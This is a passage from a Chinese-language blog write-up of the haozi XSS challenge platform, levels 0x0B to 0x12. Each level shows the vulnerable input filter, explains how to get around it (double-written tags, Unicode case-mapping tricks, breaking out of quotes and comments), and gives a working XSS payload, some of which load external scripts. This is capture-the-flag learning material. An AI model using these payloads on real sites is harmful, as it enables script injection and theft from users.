+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure>
+<p>或者我们引入外部js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819095524326.jpg" alt="-w1166"></p>
+<h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤script标签，然后转大写。<br>思路很简单，双写然后引入外部js<br>payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"https://www.segmentfault.com.haozi.me/j.js"</span>&gt;&lt;<span class="regexp">/scrscriptipt&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819101334275.jpg" alt="-w1170"></p>
+<h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配将&lt; / ‘ “替换为空，而且我们的iput在注释行中，之前的注释绕过，我们需要换行。但是结尾还存在一个’ 我么需要注释掉<br>payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819103497985.jpg" alt="-w1172"></p>
+<h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将&lt;+字符串格式替换为&lt;_$1并且转大写。<br>这表示所有的标签都不能用，我们查阅资料得到</p>
+<p>在toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。在toLowerCase()函数中，字符İ会转变为i，字符K会转变为k</p>
+<p>也就是说<br>toUpperCase():</p>
+<ul>
+<li>ı  ==&gt;I</li>
+<li>ſ  ==&gt;S<br>所以我们可以用f替换s，转大写之后会变成S<br>payload：</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">"https://www.segmentfault.com.haozi.me/j.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819108530746.jpg" alt="-w1170"></p>
+<h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>又转义了一堆符号，但是我们的input在onerror属性中，所以我们采用前闭合后注释的方法让payload<br>逃逸出来<br>payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">');alert(1);//</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819109958799.jpg" alt="-w1159"></p>
+<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接先闭合，再输出<br>payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'1'</span>;alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819111656542.jpg" alt="-w1165"></p>
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了一堆字符，没啥用。<br>${s}在自定义参数的字符串值中，/替换为/，但”双引号过滤后的&quot;正好将\引入在内。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br></pre></td></tr></table></figure>
+<p>所以有payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"),alert(1)//</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819113981888.jpg" alt="-w1191"></p>
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配”双引号，并替换为\“；由于输入点在script标签外，则不能考虑html实体编码。<br>“替换成\“，在实际输出中可以在添一个\来转义掉第一个<br>payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">");alert(1);//</span></span><br></pre></td></tr></table></figure>
+<p><img src="media/15819056904673/15819117151830.jpg" alt="-w609"></p>
+<p><img src="media/15819056904673/15819116126560.jpg" alt="-w1162"></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://yoursite.com">John Doe</a>
+            <p>原文链接：<a href="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/">http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/</a>
+            <p>发表日期：<a href="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/">March 21st 2020, 5:13:50 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/">March 21st 2020, 5:06:13 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/03/21/Pikachu-CSRF/" title= "Pikachu-CSRF">
+                    <div class="nextTitle">Pikachu-CSRF</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/21/Pikachu-%E8%AF%BB%E5%8F%96/" title= "Pikachu-读取">
+                    <div class="prevTitle">Pikachu-读取</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1257235873@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/zitui996" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/phoenix-nirvana-97-43" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/283684259" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#haozi-XSS平台WriteUP"><span class="toc-number">1.</span> <span class="toc-text">haozi XSS平台WriteUP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">1.3.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">1.4.</span> <span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-number">1.5.</span> <span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-number">1.6.</span> <span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-number">1.7.</span> <span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07"><span class="toc-number">1.8.</span> <span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08"><span class="toc-number">1.9.</span> <span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09"><span class="toc-number">1.10.</span> <span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A"><span class="toc-number">1.11.</span> <span class="toc-text">0x0A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B"><span class="toc-number">1.12.</span> <span class="toc-text">0x0B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C"><span class="toc-number">1.13.</span> <span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D"><span class="toc-number">1.14.</span> <span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E"><span class="toc-number">1.15.</span> <span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F"><span class="toc-number">1.16.</span> <span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10"><span class="toc-number">1.17.</span> <span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11"><span class="toc-number">1.18.</span> <span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12"><span class="toc-number">1.19.</span> <span class="toc-text">0x12</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" >代码审计 | 变量覆盖</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" >代码审计 | 序列化与反序列化漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/%E6%97%A5%E8%AF%AD%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" >日语基础学习(一)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-upload/" >Pikachu-upload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SSRF/" >Pikachu-SSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%B8%89)/" >Pikachu-SQL注入(三)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-CSRF/" >Pikachu-CSRF</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C)/" >Pikachu-SQL注入(二)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-SQL%E6%B3%A8%E5%85%A5/" >Pikachu-SQL注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-XSS/" >Pikachu-XSS</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-jsonp/" >Pikachu-jsonp</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-xxe/" >Pikachu-xxe</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" >Pikachu-命令执行</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" >Pikachu-文件包含</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" >Pikachu-文件泄露</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E8%AF%BB%E5%8F%96/" >Pikachu-读取</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/Pikachu-%E8%B6%8A%E6%9D%83/" >Pikachu-越权</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/21/haozi%20XSS%E5%B9%B3%E5%8F%B0WriteUP/" >haozi XSS平台WriteUP</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
